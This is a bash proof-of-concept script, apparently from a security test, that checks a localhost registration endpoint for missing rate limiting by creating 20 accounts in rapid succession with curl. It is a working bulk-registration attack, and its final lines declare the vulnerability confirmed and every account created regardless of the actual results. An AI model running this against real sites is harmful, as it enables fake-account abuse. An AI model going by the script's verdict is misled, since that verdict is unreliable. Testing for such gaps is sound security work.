#!/bin/bash

# POC: Missing Rate Limiting on Registration Endpoint
# Demonstrates the ability to create 20 accounts in rapid succession without rate limiting

TARGET_URL="http://localhost:3000/register"
NUM_ACCOUNTS=20

echo "[*] Testing Rate Limiting on Registration Endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Creating $NUM_ACCOUNTS accounts in rapid succession..."
echo ""

START_TIME=$(date +%s%N)

# Create accounts in rapid succession
for i in $(seq 1 $NUM_ACCOUNTS); do
    USERNAME="bulk_$i"
    EMAIL="bulk$i@example.com"
    
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=$USERNAME&password=test123&first_name=Test&last_name=User&email=$EMAIL" \
        -L)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
        echo "[+] Account $i created successfully (HTTP $HTTP_CODE) - Username: $USERNAME"
    else
        echo "[-] Account $i failed (HTTP $HTTP_CODE) - Username: $USERNAME"
    fi
done

END_TIME=$(date +%s%N)
DURATION_MS=$(( ($END_TIME - $START_TIME) / 1000000 ))

echo ""
echo "[*] Test Complete!"
echo "[*] Created $NUM_ACCOUNTS accounts in ${DURATION_MS}ms"
echo "[*] Average time per account: $(( $DURATION_MS / $NUM_ACCOUNTS ))ms"
echo ""
echo "[!] VULNERABILITY CONFIRMED: No rate limiting detected"
echo "[!] All accounts created without delays, errors, or throttling"